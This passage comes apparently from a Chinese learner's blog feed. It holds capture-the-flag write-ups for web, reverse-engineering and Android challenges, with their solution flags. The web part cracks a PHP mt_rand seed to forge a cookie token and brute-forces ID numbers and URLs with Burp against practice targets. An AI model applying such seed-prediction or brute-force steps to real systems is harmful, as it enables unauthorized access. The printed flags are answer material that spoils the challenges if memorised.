class="line"><span class="variable">$a</span> = intval(mt_rand());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210410114414367.png" alt="在这里插入图片描述"></p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><p>又是个代码审计！<br><img src="https://img-blog.csdnimg.cn/20210410115110902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如果r为0的话，会给出随机数，此时我们可以逆推出种子！<br>首先得先弄工具！<br><img src="https://img-blog.csdnimg.cn/20210410125823620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是下载php_mt_seed的压缩包后解压的文件夹！<br><img src="https://img-blog.csdnimg.cn/20210410130121895.png" alt="在这里插入图片描述"><br>在kali里面进行逆推！！！<br><img src="https://img-blog.csdnimg.cn/20210410130524940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后编写脚本找出tookie的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">671423340</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;<span class="comment">#210992050</span></span><br><span class="line"><span class="variable">$result</span> = mt_rand()+mt_rand();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;<span class="comment">#2380334769</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>首先get传参传入210992050，然后构造cookie头里的token=2380334769</p></blockquote><p>token这个可以用插件进行传参！或者在开发者工具里面的应用程序里面新增要给cookie！</p><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p>刚开始让安装什么东西，吓到我了！<br><img src="https://img-blog.csdnimg.cn/20210410153309464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>F12查看源代码！！！<br><img src="https://img-blog.csdnimg.cn/20210410153547267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>大威天龙！呆，我一眼就看到了密码了！url类型是checkdb.php！<br><img src="https://img-blog.csdnimg.cn/20210410155104810.png" alt="在这里插入图片描述"><br>其实BP也是可以的！<br><img src="https://img-blog.csdnimg.cn/20210410155222468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><p>菜鸡学院招生了，我感觉我应该只能上这个学院了！<br><img src="https://img-blog.csdnimg.cn/20210410155621492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后下载开，我们看看！<br><img src="https://img-blog.csdnimg.cn/20210410155711199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>身份证号中间是没有的！<br>我们点击学生学籍信息查询系统找找！发现需要身份证，这里需要爆破！<br><img src="https://img-blog.csdnimg.cn/20210410161806923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后发送到爆破模块里面去！<br><img src="https://img-blog.csdnimg.cn/20210410162120706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后开始爆破！<br><img src="https://img-blog.csdnimg.cn/20210410164034130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时我们便可以进行Unicode解码了，BP上没有这个功能！<br><img src="https://img-blog.csdnimg.cn/20210410164518324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们便可以进去管理系统了！<br><img src="https://img-blog.csdnimg.cn/20210410164638743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>OK了！</p><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p>这道题时爆破url的，先抓包！<br><img src="https://img-blog.csdnimg.cn/20210410164846833.png" alt="在这里插入图片描述"><br>然后进入BP里面去！<br><img src="https://img-blog.csdnimg.cn/20210410165334243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>开始爆破！<br><img src="https://img-blog.csdnimg.cn/20210410165906614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr />学到了很多！！！<!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1835514122&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>serial-150 &amp; secret-string-400 &amp; testre</title>
      <link href="posts/884863d2/"/>
      <url>posts/884863d2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="serial-150"><a href="#serial-150" class="headerlink" title="serial-150"></a>serial-150</h1><p>先用EP探测一番，看看是个什么东东！<br><img src="https://img-blog.csdnimg.cn/2021033120343098.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再用ida直接打开看源代码！<br><img src="https://img-blog.csdnimg.cn/20210331205740611.jpg" alt="在这里插入图片描述"><br>可以看到三条消息，不过全找rodata段，在代码里找找！<br><img src="https://img-blog.csdnimg.cn/20210331205913941.png" alt="在这里插入图片描述"><br>走，看看！啥都不是，啥都没有！<br>所以又去找找资料(看大师傅的博客！)需要ida动态调试，好家伙！终于让我来KO这个难点了！</p><blockquote><p>把ida中dbgsrv目录下的linux_server或者linux_serverx64放到linux中</p><blockquote><p><img src="https://img-blog.csdnimg.cn/20210331210642775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后将其移至到Linus上！</p></blockquote><p>chmod a+x linux_serverx64改变属性，然后运行 linux_serverx64<br><img src="https://img-blog.csdnimg.cn/20210331211031193.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210331214110338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Romote Linux debugger这个选择要选上！！！<br>此时就可以调试了！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210331220008769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后接着调试！<br>然后调到最后了，不过还是的到一些有用的信息！<br><img src="https://img-blog.csdnimg.cn/20210331220439990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们再接着调，这就是一次比一次有经验。<br>唉，着实不容易呀，隔了好几天后，有开始接受这部分，又开始再一次的调试！<br><img src="https://img-blog.csdnimg.cn/20210404201025248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加油！争取下一次成功！<br>没想到，断网了，调试中断了，气死了！！！<br>调试了半天还是没个所以然！<br>我把一些图给上来，有些是调试过不了的地方！<br><img src="https://img-blog.csdnimg.cn/20210404204951238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们再进行这次跳转！前几次都是因为长度不够直接失败！所以这次我注意一下！<br><img src="https://img-blog.csdnimg.cn/20210404205419493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进去时要小心一点，一次调试成功！<br><img src="https://img-blog.csdnimg.cn/20210404205550456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>马上就成功了！<br><img src="https://img-blog.csdnimg.cn/20210404210121398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后重复这一步骤，就可以得到了flag了！<br><strong><em>EZ9dmq4c8g9G7bAV</em></strong></p><hr /><p>本题学习到了如何进行ida远程动态调试，以及对一些简单的汇编指令进行一定的组合判断它是干什么的！</p><h1 id="secret-string-400"><a href="#secret-string-400" class="headerlink" title="secret-string-400"></a>secret-string-400</h1><p>后缀为gz，第一次见这种压缩包！<br><img src="https://img-blog.csdnimg.cn/20210405114812942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当然我们也可以直接就去用ida看看，是可以发现无法进行逆向的，所以我们解压它！<br><img src="https://img-blog.csdnimg.cn/20210405115024967.png" alt="在这里插入图片描述"><br>有点像web题型，不过它是给了代码的！<br>我们打开看看！<br><img src="https://img-blog.csdnimg.cn/20210405115343324.png" alt="在这里插入图片描述"><br>这是用火狐打开所显示的内容，用IE打开是没有办法完整显示的，此时我们再来看看另一个html页面！<br><img src="https://img-blog.csdnimg.cn/20210405115614401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有意思！没想到是个这样子的逆向！<br>然后源代码是没有相关内容的，但是再js里面有，所以我们可以找到js，用记事本打开即可！<br>然后我们在调试器中进行一系列调试！<br><img src="https://img-blog.csdnimg.cn/20210405121757702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过调试结果在console显示必须在run函数加上一句话！<br><img src="https://img-blog.csdnimg.cn/20210405121851783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们便可以根据代码写出解密脚本！<br><img src="https://img-blog.csdnimg.cn/20210405122604682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70"><br><strong><em>WOW_so_EASY</em></strong><br>flag就有了！</p><hr /><p>这道题主要考察了对与网页web上的一些简单登录进行的逆向！主要是加的那句话，将代码给泄露出来！然后根据其进行逆向！</p><h1 id="testre"><a href="#testre" class="headerlink" title="testre"></a>testre</h1><p>做题来了手感！赶紧再做一题！<br>EP先探查没有什么东西！<br><img src="https://img-blog.csdnimg.cn/20210405142936748.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>主要就是这个检查函数，所以我们就进去里面进行一番探查！<br><img src="https://img-blog.csdnimg.cn/20210405143216546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再到函数上面进行细致分析！<br><img src="https://img-blog.csdnimg.cn/20210405144640527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base58不是2的整次幂，所以原理不是base64那样子。<br><img src="https://img-blog.csdnimg.cn/20210405145335562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong><em>flag{base58_is_boring}</em></strong><br>flag就有了，主要是要理解这个base58是个什么东西！</p><hr /><p>base58编码，其实源于比特币！<br>base58编码先将输入转换为ASCLL码值(按256进制算！)，然后转换为10进制的数，然后转换为58进制数，此时我们将其按照base58表转换！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1834322795&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-mobile新手二</title>
      <link href="posts/dd958e3d/"/>
      <url>posts/dd958e3d/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h1><p>看题目是个简单的java语言编写的程序！<br>然后我们直接用jadx打开！<br><img src="https://img-blog.csdnimg.cn/20210328095933734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们再看看下面的class了！<br><img src="https://img-blog.csdnimg.cn/20210328192434200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>到这里其实有点看不懂！因为有很多函数看不懂！所以先了一波函数的分析！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">findViewById  安卓编程的定位函数，主要是引用.R文件里的引用名。</span><br><span class="line">toString() 方法用于返回以一个字符串表示的 Number 对象值。</span><br><span class="line">booleanValue()方法用于返回此布尔对象表示的值，该值转换为boolean类型（通过强制转换）</span><br><span class="line">TextView（文本框）        EditText(输入框)</span><br><span class="line">getText()方法本身是获得控间中文符串文本面量值。</span><br><span class="line">intValue（） 如Integer类型，就会有intValue（）方法，意思是说，把Integer类型转化为Int类型。</span><br><span class="line">valueOf（） 如String就有valueOf（）方法，意思是说，要把参数中给的值，转化为String类型，Integer的valueOf（）就是把参数给的值，转化为Integer类型。</span><br><span class="line">remove方法用于bai移除Set集合中的指定对象。</span><br></pre></td></tr></table></figure><p>到a类里面发现有构造器，而且还是好几种！并且在b类里面的内容是非常相似的！</p><p><img src="https://img-blog.csdnimg.cn/20210329103512693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是a类，此时我们可以再看看b类！<img src="https://img-blog.csdnimg.cn/20210329103639340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们可以发现在a类和b类里面都有一串原始数据！它们两个拼接到一起，然后我们再进行位移解密！<br>我们结合上面的一系列进行编写脚本进行解密！在这里说一句，还是去学学Java再来看看安卓逆向，这样子比较好看一点，容易理解，不然很难去理解里面的一些语句！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque <span class="comment"># 双端队列简化随机密钥实现</span></span><br><span class="line">alpha = deque(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>) </span><br><span class="line">key_b = deque([<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">25</span>])</span><br><span class="line">key_a = deque([<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>])</span><br><span class="line">c = <span class="string">&#x27;wigwrkaugala&#x27;</span></span><br><span class="line"><span class="comment">#这里拷贝了其它人的代码，主要是该collections的理解，我会在下面解释的</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span> </span><br><span class="line">    i = key_a[(<span class="built_in">ord</span>(s) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))]</span><br><span class="line">    i = key_b[(i)] </span><br><span class="line">    print(alpha[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    key_b.append(key_b.popleft()) </span><br><span class="line">    alpha.append(alpha.popleft())</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> c: decode(s)</span><br><span class="line">print(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment">#deque容器为一个给定类型的元素进行线性处理，像向量一样。</span></span><br><span class="line"><span class="comment">#它能够快速地随机访问任一个元素，并且能够高效地插入和删除容器的尾部元素。</span></span><br><span class="line"><span class="comment">#deque，全名double-ended queue 是一种具有队列和栈的性质的数据结构。双端队列中的元素可以从两端弹出，其限定插入和删除操作在表的两端进行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#deque():创建一个空deque</span></span><br><span class="line"><span class="comment">#popleft()从队列的左边删除元素，并且返回删除值</span></span><br></pre></td></tr></table></figure><p><strong>flag{venividivkcr}</strong></p><hr /><p>collections是Python内建的一个集合模块，提供了许多有用的集合类。<br>该类其实不需要太多的理解，主要是那几个函数，还有就是双端队列这个概念，和它的一些操作函数！</p><h1 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h1><p>直接打开就可以看到类很少。而且类的内容比较简单，所以应该比较简单！<img src="https://img-blog.csdnimg.cn/20210329111326187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们再看看另一个类！<br><img src="https://img-blog.csdnimg.cn/20210329111520997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二个内置for循环里面的else里面有个=号，所以猜测是个base64加密，至于是否是变种的就不得而知了！<br>还有一点就是刚开始加载了一个LIB的库，所以此时我们用ida打开看看lib库的native！<br>找到Java_com_a_easyjni_MainActivity_ncheck这个函数，怎么找到的，可以搜索字符串，查看可疑的数据，或者直接再函数名中寻找到关于Java的函数！<br><img src="https://img-blog.csdnimg.cn/20210329112531682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析它的过程，它是交换过后的，前16位与后16位交换，其实可以从==号看出这个问题！<br>然后我们将base64表改为a类的a数组值就行了！<br><strong>flag{just_ANot#er_@p3}</strong></p><p>这里又说明了我们要备一个base64代码，需要的时候换一个base64表就可以了！</p><hr /><h1 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h1><p>直接用jadx打开然后找到MainActivity类，其实就是C里面的main函数了！<br>其它两个类里面明显没有什么有用的东西！<br><img src="https://img-blog.csdnimg.cn/20210329190158492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们再去ida中看看呗！<br><img src="https://img-blog.csdnimg.cn/20210329190542804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还有个getFlag()函数，我们去看看它里面是怎么运行的！<br><img src="https://img-blog.csdnimg.cn/20210329190903908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里有一个思路，便是我们用APKIDE这个修改让它通过判断！就跟OD一样修改值差不多，不过我javashi15版本，这个便用不了了！</p><p>暂时放弃！唉唉！</p><hr /><h1 id="RememberOther"><a href="#RememberOther" class="headerlink" title="RememberOther"></a>RememberOther</h1><p>这道题还是比较怎么说？</p><p><img src="https://img-blog.csdnimg.cn/2021032919293256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我想了又想，终于打开了我的模拟器！<br><img src="https://img-blog.csdnimg.cn/20210329193302177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后md5解密一下！<br><img src="https://img-blog.csdnimg.cn/20210329193543786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此位最终flag，谁知道安卓怎么来的，我没去看ida，也不想去看了，能省点事就省点事！<br><strong><em>YOU_KNOW_ANDROID</em></strong></p><p>现在越做ctf越感觉难！哎！大概是我太菜了吧！</p><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1826179038&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mobile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crackme &amp; android-app-100 &amp; APK-逆向2</title>
      <link href="posts/e33887c1/"/>
      <url>posts/e33887c1/</url>
      
